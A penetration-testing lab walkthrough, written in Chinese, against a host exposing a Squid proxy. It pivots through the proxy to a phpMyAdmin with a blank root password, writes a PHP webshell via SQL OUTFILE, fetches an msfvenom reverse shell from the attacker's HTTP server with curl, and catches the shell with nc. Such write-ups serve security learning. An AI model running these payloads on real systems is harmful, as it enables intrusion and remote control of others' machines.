## nmap
```json
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-12 22:12 CST
Nmap scan report for 192.168.157.189
Host is up (0.32s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
3128/tcp open  http-proxy Squid http proxy 4.14
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.14

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.59 seconds
```

發現 3128 port 有起 proxy 服務，透過 curl --proxy 去訪問看到 error
```bash
curl --proxy http://192.168.157.189:3128 http://192.168.157.189
```

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head>
<meta http-equiv="Content-Type" CONTENT="text/html; charset=utf-8">
<title>ERROR: The requested URL could not be retrieved</title>
<style type="text/css"><!--
 /*
 * Copyright (C) 1996-2021 The Squid Software Foundation and contributors
 *
 * Squid software is distributed under GPLv2+ license and includes
 * contributions from numerous individuals and organizations.
 * Please see the COPYING and CONTRIBUTORS files for details.
 */

/*
 Stylesheet for Squid Error pages
 Adapted from design by Free CSS Templates
 http://www.freecsstemplates.org
 Released for free under a Creative Commons Attribution 2.5 License
*/

/* Page basics */
* {
	font-family: verdana, sans-serif;
}

html body {
	margin: 0;
	padding: 0;
	background: #efefef;
	font-size: 12px;
	color: #1e1e1e;
}

/* Page displayed title area */
#titles {
	margin-left: 15px;
	padding: 10px;
	padding-left: 100px;
	background: url('/squid-internal-static/icons/SN.png') no-repeat left;
}

/* initial title */
#titles h1 {
	color: #000000;
}
#titles h2 {
	color: #000000;
}

/* special event: FTP success page titles */
#titles ftpsuccess {
	background-color:#00ff00;
	width:100%;
}

/* Page displayed body content area */
#content {
	padding: 10px;
	background: #ffffff;
}

/* General text */
p {
}

/* error brief description */
#error p {
}

/* some data which may have caused the problem */
#data {
}

/* the error message received from the system or other software */
#sysmsg {
}

pre {
}

/* special event: FTP / Gopher directory listing */
#dirmsg {
    font-family: courier, monospace;
    color: black;
    font-size: 10pt;
}
#dirlisting {
    margin-left: 2%;
    margin-right: 2%;
}
#dirlisting tr.entry td.icon,td.filename,td.size,td.date {
    border-bottom: groove;
}
#dirlisting td.size {
    width: 50px;
    text-align: right;
    padding-right: 5px;
}

/* horizontal lines */
hr {
	margin: 0;
}

/* page displayed footer area */
#footer {
	font-size: 9px;
	padding-left: 10px;
}


body
:lang(fa) { direction: rtl; font-size: 100%; font-family: Tahoma, Roya, sans-serif; float: right; }
:lang(he) { direction: rtl; }
 --></style>
</head><body id=ERR_CONNECT_FAIL>
<div id="titles">
<h1>ERROR</h1>
<h2>The requested URL could not be retrieved</h2>
</div>
<hr>

<div id="content">
<p>The following error was encountered while trying to retrieve the URL: <a href="http://192.168.157.189/">http://192.168.157.189/</a></p>

<blockquote id="error">
<p><b>Connection to 192.168.157.189 failed.</b></p>
</blockquote>

<p id="sysmsg">The system returned: <i>(111) Connection refused</i></p>

<p>The remote host or network may be down. Please try the request again.</p>

<p>Your cache administrator is <a href="mailto:webmaster?subject=CacheErrorInfo%20-%20ERR_CONNECT_FAIL&amp;body=CacheHost%3A%20SQUID%0D%0AErrPage%3A%20ERR_CONNECT_FAIL%0D%0AErr%3A%20(111)%20Connection%20refused%0D%0ATimeStamp%3A%20Wed,%2012%20Jul%202023%2014%3A32%3A33%20GMT%0D%0A%0D%0AClientIP%3A%20192.168.45.231%0D%0AServerIP%3A%20192.168.157.189%0D%0A%0D%0AHTTP%20Request%3A%0D%0AGET%20%2F%20HTTP%2F1.1%0AUser-Agent%3A%20curl%2F7.88.1%0D%0AAccept%3A%20*%2F*%0D%0AProxy-Connection%3A%20Keep-Alive%0D%0AHost%3A%20192.168.157.189%0D%0A%0D%0A%0D%0A">webmaster</a>.</p>

<br>
</div>

<hr>
<div id="footer">
<p>Generated Wed, 12 Jul 2023 14:32:33 GMT by SQUID (squid/4.14)</p>
<!-- ERR_CONNECT_FAIL -->
</div>
</body></html>
```

嘗試於 web & /etc/proxychains4.conf 新增 proxy
```json
http 192.168.157.189 3128
```

查到資料 [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid)，可用 nmap 或 spose 掃描
重新使用 proxychaing +  nmap 掃描
```bash
proxychains -q nmap -A -sV -T4 localhost
```

使用 spose 掃描
```bash
python3 spose.py --proxy http://192.168.157.189:3128 --target 192.168.157.189
```
```json
Using proxy address http://192.168.157.189:3128
192.168.157.189 3306 seems OPEN
192.168.157.189 8080 seems OPEN
```

發現 3306 & 8080 皆有服務，故透過 web 先訪問 http://192.168.157.189:8080
![[截圖 2023-07-12 下午10.54.14.png]]

連線至 phpmyadmin，發現可以用 root/ 直接無密碼登入 (預設)
![[截圖 2023-07-12 下午11.37.31.png]]

透過 sql 可上傳檔案，先上傳個 webshell
```sql
select "<?php system($_GET['cmd']); ?>" into OUTFILE 'C:/wamp/www/webshell.php'
```

接著便可透過 webshell 下指令
```http
http://192.168.157.189:8080/webshell.php?cmd=dir
```

接著透過 msfvenom 製造 reverse shell
```bash
msfvenom -p php/reverse_php LHOST=192.168.45.231 LPORT=4444 -f raw -o shell.php
```

透過 webshell 上傳，先開啟 python web server
```bash
python3 -m http.server 8000
```

於 webshell 用 curl 下載
```http
http://192.168.157.189:8080/webshell.php?cmd=curl%20--output%20shell.php%20--url%20http://192.168.45.231:8000/shell.php
```

接著掛 nc 監聽
```bash
nc -nvlp 4444
```

並透過 webshell 觸發 reverse shell
```http
http://192.168.157.189:8080/shell.php
```

Got Shell!